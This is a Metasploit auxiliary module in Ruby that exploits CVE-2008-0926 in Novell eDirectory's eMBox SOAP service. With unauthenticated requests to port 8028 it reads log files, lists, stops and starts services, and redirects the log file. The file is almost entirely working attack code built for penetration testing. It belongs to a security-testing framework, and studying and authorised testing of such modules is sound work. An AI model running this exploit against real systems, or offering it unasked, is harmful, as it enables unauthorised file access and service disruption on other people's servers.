##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Novell eDirectory eMBox Unauthenticated File Access',
      'Description'    => %q{
          This module will access Novell eDirectory's eMBox service and can run the
        following actions via the SOAP interface: GET_DN, READ_LOGS, LIST_SERVICES,
        STOP_SERVICE, START_SERVICE, SET_LOGFILE.
      },
      'References'     =>
        [
          [ 'CVE', '2008-0926' ],
          [ 'BID', '28441' ],
          [ 'OSVDB', '43690' ]
        ],
      'Author'         =>
        [
          'Nicob',
          'MC',    #Initial Metasploit module
          'sinn3r'
        ],
      'License'        => MSF_LICENSE,
      'Actions'        =>
        [
          [
            'GET_DN',
            {
              'Description' => 'Get DN',
              'CMD'         => 'novell.embox.connmgr.serverinfo',
              'PATTERN'     => /<ServerDN dt="Binary">(.*)<\/ServerDN>/,
              'USE_PARAM'   => false
            }
          ],
          [
            'READ_LOGS',
            {
              'Description' => 'Read all the log files',
              'CMD'         => 'logger.readlog',
              'PATTERN'     => /<LogFileData>(.*)<\/LogFileData>/,
              'USE_PARAM'   => false
            }
          ],
          [
            'LIST_SERVICES',
            {
              'Description' => 'List services',
              'CMD'         => 'novell.embox.service.getServiceList',
              'PATTERN'     => /<DSService:Message dt=\"Binary\">(.*)<\/DSService:Message>/,
              'USE_PARAM'   => false
            }
          ],
          [
            'STOP_SERVICE',
            {
              'Description' => 'Stop a service',
              'CMD'         => 'novell.embox.service.stopService',
              'PATTERN'     => /<DSService:Message dt="Binary">(.*)<\/DSService:Message>/,
              'PARAM'       => '<Parameters><params xmlns:DSService="service.dtd">'+
                               '<DSService:moduleName>__PARAM__</DSService:moduleName>'+
                               '</params></Parameters>',
              'USE_PARAM'   => true
            }
          ],
          [
            'START_SERVICE',
            {
              'Description' => 'Start a service',
              'CMD'         => 'novell.embox.service.startService',
              'PATTERN'     => /<DSService:Message dt="Binary">(.*)<\/DSService:Message>/,
              'PARAM'       => '<Parameters>' +
                               '<params xmlns:DSService="service.dtd">' +
                               '<DSService:moduleName>__PARAM__</DSService:moduleName>'+
                               '</params></Parameters>',
              'USE_PARAM'   => true
            }
          ],
          [
            'SET_LOGFILE',
            {
              'Description' => 'Read Log File',
              'CMD'         => 'logger.setloginfo',
              'PATTERN'     => /<Logger:Message dt="Binary">(.*)<\/Logger:Message>/,
              'PARAM'       => '<Parameters><params><logFile>__PARAM__</logFile>'+
                               '<logOptionAppend/></params></Parameters>',
              'USE_PARAM'   => true
            }
          ]
        ],
      'DefaultAction'  => 'LIST_SERVICES'
    ))

    register_options(
      [
        Opt::RPORT(8028),
        OptString.new("PARAM", [false, 'Specify a parameter for the action'])
      ], self.class)
  end

  def run

    if action.opts['USE_PARAM']
      if datastore['PARAM'].nil? or datastore['PARAM'].empty?
        print_error("You must supply a parameter for action: #{action.name}")
        return
      else
        param = action.opts['PARAM'].gsub(/__PARAM__/, datastore['PARAM'])
      end
    else
      param = '<Parameters><params/></Parameters>'
    end

    template = %Q|<?xml version="1.0"?>
    <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
    <SOAP-ENV:Header/>
    <SOAP-ENV:Body>
    <dispatch>
    <Action>#{action.opts['CMD']}</Action>
    <Object/>#{param}</dispatch>
    </SOAP-ENV:Body>
    </SOAP-ENV:Envelope>|

    template = template.gsub(/^\t\t/, '')
    template = template.gsub(/\n/, '')

    connect
    print_status("Sending command: #{action.name}...")
    res = send_request_cgi({
      'method'   => 'POST',
      'uri'      => '/SOAP',
      'data'     => template + "\n\n",
      'headers'  =>
        {
          'Content-Type' => 'text/xml',
          'SOAPAction' => "\"" + Rex::Text.rand_text_alpha_upper(rand(25) + 1) + "\"",
        }
    }, 25)

    if res.nil?
      print_error("Did not get a response from server")
      return
    end

    raw_data = res.body.scan(/#{action.opts['PATTERN']}/).flatten[0]
    print_line("\n" + Rex::Text.decode_base64(raw_data))

    disconnect
  end
end
